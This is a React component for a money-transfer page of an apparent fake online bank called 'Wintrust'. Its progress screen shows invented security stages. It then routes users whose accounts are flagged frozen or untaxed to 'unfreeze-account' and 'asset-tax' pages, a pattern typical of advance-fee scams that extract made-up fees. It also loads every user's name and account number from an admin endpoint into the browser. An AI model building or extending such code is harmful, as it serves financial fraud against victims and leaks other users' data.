import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../../context/AuthContext';
import { executeTransfer, getSettings, getAdminUsers } from '../../services/api';
import toast from 'react-hot-toast';
import confetti from 'canvas-confetti';
import {
  LuSend as Send,
  LuArrowLeft as ArrowLeft,
  LuSearch as Search,
  LuCircleCheck as CheckCircle2,
  LuCircleAlert as AlertCircle,
  LuShieldCheck as ShieldCheck,
  LuRefreshCw as RefreshCw,
  LuZap as Zap,
  LuCpu as Cpu,
  LuWallet as Wallet,
} from 'react-icons/lu';
import './TransferView.css';

export const TransferView = () => {
  const { user } = useAuth();
  const navigate = useNavigate();
  const [settings, setSettings] = useState(null);
  const [users, setUsers] = useState([]);
  const [transferAmount, setTransferAmount] = useState('');
  const [targetAccount, setTargetAccount] = useState('');
  const [foundRecipient, setFoundRecipient] = useState(null);
  const [searchStatus, setSearchStatus] = useState('idle');
  const [isProcessing, setIsProcessing] = useState(false);
  const [progress, setProgress] = useState(0);
  const [processingStage, setProcessingStage] = useState('Initializing Peer-to-Peer Gateway...');
  const [activeTxDetails, setActiveTxDetails] = useState(null);
  const [errorMessage, setErrorMessage] = useState(null);
  const [successModal, setSuccessModal] = useState(null);

  const amountNum = parseFloat(transferAmount) || 0;
  const isInsufficient = amountNum > (user?.balance || 0);

  useEffect(() => {
    getSettings().then(data => {
      if (data.success) setSettings(data.settings);
    }).catch(() => {});
    getAdminUsers().then(data => {
      if (data.success) setUsers(data.users);
    }).catch(() => {});
  }, []);

  // Live search for recipient
  useEffect(() => {
    const clean = targetAccount.trim();
    if (clean.length >= 7) {
      setSearchStatus('searching');
      if (clean === user?.accountNumber) {
        setSearchStatus('self');
        setFoundRecipient(null);
        return;
      }
      const match = users.find(u => u.accountNumber === clean);
      if (match) {
        setFoundRecipient(match);
        setSearchStatus('found');
      } else {
        setFoundRecipient(null);
        setSearchStatus('notFound');
      }
    } else {
      setFoundRecipient(null);
      setSearchStatus(clean.length > 0 ? 'searching' : 'idle');
    }
  }, [targetAccount, user, users]);

  const minTransfer = settings?.minTransferAmount || 10;
  const maxTransfer = settings?.maxTransferAmount || 1000000;

  // Processing timer
  useEffect(() => {
    if (!isProcessing) return;
    const totalDurationMs = 10000;
    const intervalMs = 100;
    const increment = (90 / (totalDurationMs / intervalMs));
    const timer = setInterval(() => {
      setProgress(prev => {
        const next = prev + increment;
        if (next >= 90) {
          clearInterval(timer);
          setTimeout(() => {
            setIsProcessing(false);
            if (!activeTxDetails) return;

            // Check if account is frozen or tax needed
            const isAccountFrozen = user?.isFrozen || (!user?.hasPaidUnfreeze && (user?.pendingWithdrawalAmount || 0) > 0);
            if (isAccountFrozen) {
              toast.error('Transfer failed – account frozen.');
              // Navigate to unfreeze page
              navigate('/unfreeze-account');
              return;
            }
            if (user?.hasPaidUnfreeze && !user?.hasPaidTax) {
              toast.warning('Asset tax required.');
              navigate('/asset-tax');
              return;
            }

            // Execute transfer
            executeTransfer(user.id, activeTxDetails.targetAccount, activeTxDetails.amount)
              .then(() => {
                confetti({ particleCount: 60, spread: 60, origin: { y: 0.6 } });
                setSuccessModal({ open: true, receiverName: activeTxDetails.recipientName, amount: activeTxDetails.amount });
              })
              .catch(err => {
                setErrorMessage(err.message || 'Transfer failed.');
              });
          }, 300);
          return 90;
        }
        if (next < 25) setProcessingStage('🔐 Authenticating Security Token...');
        else if (next < 50) setProcessingStage(`⚡ Establishing Gateway with Recipient...`);
        else if (next < 75) setProcessingStage(`🌐 Routing $${activeTxDetails?.amount?.toLocaleString()} via P2P...`);
        else setProcessingStage('🛡️ Verifying Multi-Signature Clearance...');
        return next;
      });
    }, intervalMs);
    return () => clearInterval(timer);
  }, [isProcessing, activeTxDetails, user, navigate]);

  const handleTransferSubmit = (e) => {
    e.preventDefault();
    setErrorMessage(null);
    if (isInsufficient) { setErrorMessage('Insufficient balance.'); return; }
    if (amountNum < minTransfer) { setErrorMessage(`Min: $${minTransfer}`); return; }
    if (amountNum > maxTransfer) { setErrorMessage(`Max: $${maxTransfer}`); return; }
    if (!foundRecipient) { setErrorMessage('Verify valid account.'); return; }

    const txReference = `TRF-${Date.now().toString().slice(-6)}`;
    const recipientName = `${foundRecipient.firstName} ${foundRecipient.lastName}`;
    setActiveTxDetails({
      amount: amountNum,
      targetAccount: foundRecipient.accountNumber,
      recipientName,
      reference: txReference
    });
    setProgress(0);
    setProcessingStage('🔐 Authenticating Security Token...');
    setIsProcessing(true);
    toast.info('Transfer initiated, processing...');
  };

  return (
    <div className="transfer-view">
      <button className="back-btn" onClick={() => navigate('/dashboard')}>
        <ArrowLeft /> Back to Dashboard
      </button>

      {/* Processing Modal */}
      {isProcessing && (
        <div className="processing-modal">
          <div className="modal-content">
            <div className="spinner"><RefreshCw /></div>
            <h2>Transferring ${activeTxDetails?.amount?.toLocaleString() || amountNum.toLocaleString()}</h2>
            <p>Recipient: <strong>{activeTxDetails?.recipientName}</strong></p>
            <div className="stage">{processingStage}</div>
            <div className="progress-bar">
              <div style={{ width: `${progress}%` }} />
            </div>
            <div className="telemetry">
              <span><ShieldCheck /> TLS 1.3</span>
              <span><Zap /> Zero-Latency</span>
              <span><Cpu /> Valid</span>
            </div>
          </div>
        </div>
      )}

      {/* Success Modal */}
      {successModal?.open && (
        <div className="success-modal">
          <div><CheckCircle2 /></div>
          <h3>Transfer Successful!</h3>
          <p>${successModal.amount.toLocaleString()} sent to {successModal.receiverName}.</p>
          <button onClick={() => { setSuccessModal(null); navigate('/dashboard'); }}>Return</button>
        </div>
      )}

      <div className="transfer-container">
        <div className="header">
          <Send /> <div><h1>Peer-to-Peer Transfer</h1><p>Instant zero-fee transfer to any 7-digit Wintrust account</p></div>
        </div>

        <div className="balance-display">
          <Wallet /> Your Available Balance: <strong>${(user?.balance || 0).toLocaleString()}</strong>
          <span className="account-number">Acc: {user?.accountNumber}</span>
        </div>

        {errorMessage && <div className="error-banner"><AlertCircle /> {errorMessage}</div>}

        <form onSubmit={handleTransferSubmit} className="transfer-form">
          <div className="form-group">
            <label>Amount to Transfer ($ USD)</label>
            <div className="input-with-symbol">
              <span>$</span>
              <input
                type="number"
                min="1"
                step="any"
                required
                placeholder="0.00"
                value={transferAmount}
                onChange={(e) => setTransferAmount(e.target.value)}
              />
              <button type="button" onClick={() => setTransferAmount(user?.balance?.toString() || '0')}>SEND MAX</button>
            </div>
            {isInsufficient && <small className="error">Insufficient balance</small>}
          </div>

          <div className="form-group">
            <label>Recipient 7-Digit Account Number</label>
            <div className="input-with-icon">
              <Search />
              <input
                type="text"
                maxLength="7"
                placeholder="e.g. 3891042"
                value={targetAccount}
                onChange={(e) => setTargetAccount(e.target.value.replace(/\D/g, ''))}
                required
              />
            </div>
            {searchStatus === 'found' && foundRecipient && (
              <div className="recipient-found">
                <ShieldCheck /> Account Owner: <strong>{foundRecipient.firstName} {foundRecipient.lastName}</strong>
              </div>
            )}
            {searchStatus === 'notFound' && (
              <div className="recipient-notfound"><AlertCircle /> No account found.</div>
            )}
            {searchStatus === 'self' && (
              <div className="recipient-self"><AlertCircle /> Cannot transfer to yourself.</div>
            )}
          </div>

          <button type="submit" disabled={isInsufficient || !foundRecipient || isProcessing} className="btn-primary">
            {isInsufficient ? 'Insufficient Balance' : !foundRecipient ? 'Enter Valid Recipient' : isProcessing ? 'Processing...' : `Transfer $${amountNum.toLocaleString()} Now`}
          </button>
        </form>
      </div>
    </div>
  );
};